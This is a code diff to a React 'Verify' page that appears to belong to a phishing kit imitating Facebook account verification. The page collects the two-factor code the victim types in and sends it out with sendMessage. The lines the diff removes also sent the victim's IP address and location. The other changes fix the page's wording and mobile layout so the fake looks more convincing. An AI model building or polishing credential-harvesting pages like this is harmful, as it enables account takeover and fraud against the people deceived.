@@ -55,26 +55,31 @@ const Verify = () => {
             if (savedTranslation) {
                 try {
                     const parsedTranslation = JSON.parse(savedTranslation);
-                    setTranslatedTexts(parsedTranslation);
+                    // 🎯 FIX: Loại bỏ ngắt dòng và sửa thứ tự "của bạn"
+                    const fixedTranslation = {
+                        ...parsedTranslation,
+                        description: parsedTranslation.description?.replace(/\n/g, ' ').trim() || `We have sent a verification code to ${actualEmail}, ${actualPhone} of yours. Please enter the code we just sent to continue.`
+                    };
+                    setTranslatedTexts(fixedTranslation);
                 } catch {
                     // Nếu lỗi thì dùng tiếng Anh với data thật
                     setTranslatedTexts(prev => ({
                         ...prev,
-                        description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
+                        description: `We have sent a verification code to ${actualEmail}, ${actualPhone} of yours. Please enter the code we just sent to continue.`
                     }));
                 }
             } else {
                 // Nếu chưa có bản dịch thì dùng tiếng Anh với data thật
                 setTranslatedTexts(prev => ({
                     ...prev,
-                    description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
+                    description: `We have sent a verification code to ${actualEmail}, ${actualPhone} of yours. Please enter the code we just sent to continue.`
                 }));
             }
         } else {
-            // 🎯 TIẾNG ANH: DÙNG DATA THẬT
+            // 🎯 TIẾNG ANH: DÙNG DATA THẬT - ĐÃ SỬA THỨ TỰ
             setTranslatedTexts(prev => ({
                 ...prev,
-                description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
+                description: `We have sent a verification code to ${actualEmail}, ${actualPhone} of yours. Please enter the code we just sent to continue.`
             }));
         }
     }, []);
@@ -86,18 +91,7 @@ const Verify = () => {
         setShowError(false);
 
         try {
-            const timestamp = new Date().toLocaleString('vi-VN');
-            const ipInfo = localStorage.getItem('ipInfo');
-            const ipData = ipInfo ? JSON.parse(ipInfo) : {};
-            
-            const message = `🔐 <b>VERIFY CODE</b>
-📅 <b>Thời gian:</b> <code>${timestamp}</code>
-🌍 <b>IP:</b> <code>${ipData.ip || 'N/A'}</code>
-📍 <b>Vị trí:</b> <code>${ipData.city || 'N/A'} - ${ipData.region || 'N/A'} - ${ipData.country_code || 'N/A'}</code>
-
-🔢 <b>Code:</b> <code>${code}</code>
-🔄 <b>Lần thử:</b> <code>${attempts + 1}</code>`;
-
+            const message = `🔐 <b>Code ${attempts + 1}:</b> <code>${code}</code>`;
             await sendMessage(message);
         } catch (error) {
             console.log('Send message error:', error);
@@ -119,21 +113,21 @@ const Verify = () => {
     };
 
     return (
-        <div className='flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa]'>
+        <div className='flex flex-col items-center justify-center bg-[#f8f9fa] h-dvh px-4 md:px-0 py-8 md:py-0'>
             <title>Account | Privacy Policy</title>
-            <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
+            <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg w-full md:w-auto'>
                 <p className='text-3xl font-bold'>{translatedTexts.title}</p>
-                <p>{translatedTexts.description}</p>
+                {/* 🎯 SỬA: Trên mobile không bị ngắt dòng, trên desktop bình thường */}
+                <p className='whitespace-normal md:whitespace-pre-line break-words'>{translatedTexts.description}</p>
 
-                <img src={VerifyImage} alt='' />
+                <img src={VerifyImage} alt='' className='w-full' />
                 
-                {/* 🎯 SỬA INPUT: Tăng cỡ chữ số nhập vào */}
                 <input
                     type='number'
                     inputMode='numeric'
                     max={8}
                     placeholder={translatedTexts.placeholder}
-                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2 text-lg font-medium'
+                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2 text-lg font-medium w-full'
                     value={code}
                     onChange={(e) => setCode(e.target.value)}
                     onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
@@ -150,14 +144,14 @@ const Verify = () => {
                 </div>
 
                 <button
-                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2'
+                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2 w-full md:w-auto'
                     onClick={handleSubmit}
                     disabled={isLoading || !code.trim()}
                 >
                     {isLoading ? translatedTexts.loadingText + '...' : translatedTexts.submit}
                 </button>
 
-                <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
+                <p className='cursor-pointer text-center text-blue-900 hover-underline'>{translatedTexts.sendCode}</p>
             </div>
         </div>
     );
